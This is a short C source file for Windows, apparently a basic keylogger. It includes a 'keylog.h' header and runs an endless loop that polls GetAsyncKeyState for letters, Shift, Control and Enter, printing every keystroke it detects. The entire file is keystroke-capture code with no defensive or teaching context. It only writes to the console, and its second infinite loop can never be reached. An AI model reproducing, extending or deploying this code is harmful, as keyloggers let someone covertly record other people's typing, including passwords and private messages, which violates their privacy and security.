#include <windows.h>
#include <stdio.h>
#include "./keylog.h"

#define WIN32_LEAN_AND_MEAN

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
  bool check = false;
  while(true){
    int c, k;
    short Shift = GetAsyncKeyState(VK_SHIFT);


    if(Shift & 0x0001){
      if(!check){
        printf("SHIFT");
        check = true;
      }
    }

    if(Shift & 0x8000){
    }else{
      check = false;
    }

    if(GetAsyncKeyState(VK_CONTROL)) printf("CTL");
    for(c = 'A'; c <= 'Z'; c++){

      if(GetAsyncKeyState(VK_SHIFT)) k = c;
      else k = c + ('a' - 'A');
      if(GetAsyncKeyState(c)){
        printf("%c", (char)k);
      }
      if(GetAsyncKeyState(VK_RETURN) & 0b00000001){
        printf("ENTER");
      }
    }
    Sleep(50);
  }
  while(true){}
  return 0;
}